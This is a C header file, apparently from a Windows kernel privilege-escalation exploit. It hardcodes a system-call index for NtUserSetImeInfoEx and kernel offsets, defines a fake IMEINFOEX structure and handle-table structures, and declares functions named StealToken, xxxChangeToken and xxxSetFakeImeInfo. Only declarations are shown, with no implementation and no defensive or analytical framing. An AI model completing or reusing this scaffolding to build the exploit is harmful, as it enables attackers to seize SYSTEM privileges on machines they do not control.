#pragma once
#include<Windows.h>
#include<ntstatus.h>
#include<stdio.h>


#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


DWORD IndexOfNtUserSetImeInfoEx = 0x1226;
DWORD offset_KPROCESS_in_ETHREAD = 0x150;
DWORD dword_40F150 = 0xB8;
DWORD dword_40F154 = 0x16C;

typedef enum _SYSTEM_INFORMATION_CLASS     //    Q S  
{
	SystemBasicInformation,                // 00 Y N  
	SystemProcessorInformation,            // 01 Y N  
	SystemPerformanceInformation,          // 02 Y N  
	SystemTimeOfDayInformation,            // 03 Y N  
	SystemNotImplemented1,                 // 04 Y N  
	SystemProcessesAndThreadsInformation,  // 05 Y N  
	SystemCallCounts,                      // 06 Y N  
	SystemConfigurationInformation,        // 07 Y N  
	SystemProcessorTimes,                  // 08 Y N  
	SystemGlobalFlag,                      // 09 Y Y  
	SystemNotImplemented2,                 // 10 Y N  
	SystemModuleInformation,               // 11 Y N  
	SystemLockInformation,                 // 12 Y N  
	SystemNotImplemented3,                 // 13 Y N  
	SystemNotImplemented4,                 // 14 Y N  
	SystemNotImplemented5,                 // 15 Y N  
	SystemHandleInformation,               // 16 Y N  
	SystemObjectInformation,               // 17 Y N  
	SystemPagefileInformation,             // 18 Y N  
	SystemInstructionEmulationCounts,      // 19 Y N  
	SystemInvalidInfoClass1,               // 20  
	SystemCacheInformation,                // 21 Y Y  
	SystemPoolTagInformation,              // 22 Y N  
	SystemProcessorStatistics,             // 23 Y N  
	SystemDpcInformation,                  // 24 Y Y  
	SystemNotImplemented6,                 // 25 Y N  
	SystemLoadImage,                       // 26 N Y  
	SystemUnloadImage,                     // 27 N Y  
	SystemTimeAdjustment,                  // 28 Y Y  
	SystemNotImplemented7,                 // 29 Y N  
	SystemNotImplemented8,                 // 30 Y N  
	SystemNotImplemented9,                 // 31 Y N  
	SystemCrashDumpInformation,            // 32 Y N  
	SystemExceptionInformation,            // 33 Y N  
	SystemCrashDumpStateInformation,       // 34 Y Y/N  
	SystemKernelDebuggerInformation,       // 35 Y N  
	SystemContextSwitchInformation,        // 36 Y N  
	SystemRegistryQuotaInformation,        // 37 Y Y  
	SystemLoadAndCallImage,                // 38 N Y  
	SystemPrioritySeparation,              // 39 N Y  
	SystemNotImplemented10,                // 40 Y N  
	SystemNotImplemented11,                // 41 Y N  
	SystemInvalidInfoClass2,               // 42  
	SystemInvalidInfoClass3,               // 43  
	SystemTimeZoneInformation,             // 44 Y N  
	SystemLookasideInformation,            // 45 Y N  
	SystemSetTimeSlipEvent,                // 46 N Y  
	SystemCreateSession,                   // 47 N Y  
	SystemDeleteSession,                   // 48 N Y  
	SystemInvalidInfoClass4,               // 49  
	SystemRangeStartInformation,           // 50 Y N  
	SystemVerifierInformation,             // 51 Y Y  
	SystemAddVerifier,                     // 52 N Y  
	SystemSessionProcessesInformation      // 53 Y N  
} SYSTEM_INFORMATION_CLASS;


typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG Count;//内核中以加载的模块的个数
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
#define IMEINFO_SIZE 28
#define IM_UI_CLASS_SIZE 16
#define IM_DESC_SIZE 50
#define IM_FILE_SIZE 80
typedef struct tagIMEINFOEX {
	HKL                 hkl;
	BYTE			    ImeInfo[IMEINFO_SIZE];
	WCHAR               wszUIClass[IM_UI_CLASS_SIZE];
	DWORD               fdwInitConvMode;    // Check this later
	BOOL                fInitOpen;          // Check this later
	BOOL                fLoadFlag;
	DWORD               dwProdVersion;
	DWORD               dwImeWinVersion;
	WCHAR               wszImeDescription[IM_DESC_SIZE];
	WCHAR               wszImeFile[IM_FILE_SIZE]; 
	DWORD				fSysWow64Only : 1;
	DWORD				fCUASLayer : 1;
	DWORD				dummy : 30;
} IMEINFOEX, *PIMEINFOEX;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWCH   Buffer;  //(WCHAR *)       //一块指针,指向我们存放字符串的地址
} UNICODE_STRING,*PUNICODE_STRING;
typedef PVOID( WINAPI * pfnPsReferencePrimaryToken)(PVOID PEPROCESS);


typedef NTSTATUS(NTAPI *pfnZwQuerySystemInformation)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
	);

typedef BOOLEAN( WINAPI *pfnRtlCreateUnicodeStringFromAsciiz)(
	OUT PUNICODE_STRING DestinationString,
	IN CHAR* SourceString
	);


typedef NTSTATUS(WINAPI *pfnLdrLoadDll)(
	IN PWSTR DllPath OPTIONAL,
	IN PULONG DllCharacteristics OPTIONAL,
	IN PUNICODE_STRING DllName,
	OUT PVOID *DllHandle
	);

typedef NTSTATUS(WINAPI *pfnLdrUnloadDll)(
	IN PVOID DllHandle
	);

typedef NTSTATUS(WINAPI* pfnNtAllocateVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID     *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
);
typedef NTSTATUS(WINAPI* pfnNtFreeVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID     *BaseAddress,
	PSIZE_T   RegionSize,
	ULONG     FreeStyle
	);

LONG WINAPI VectoredHandler1(
	struct _EXCEPTION_POINTERS *ExceptionInfo
);


BOOL init();
INT VersionCheck();
INT GetVersionNum();
PVOID ExportFromKernel(const LPSTR name);

DWORD __stdcall xxxChangeToken();

PVOID GetHandleAddress(HANDLE handle);
VOID  xxxSetFakeImeInfo(PIMEINFOEX fake, INT GdtAddr, BOOL ReCover);
VOID __stdcall StealToken(PVOID EPROCESS);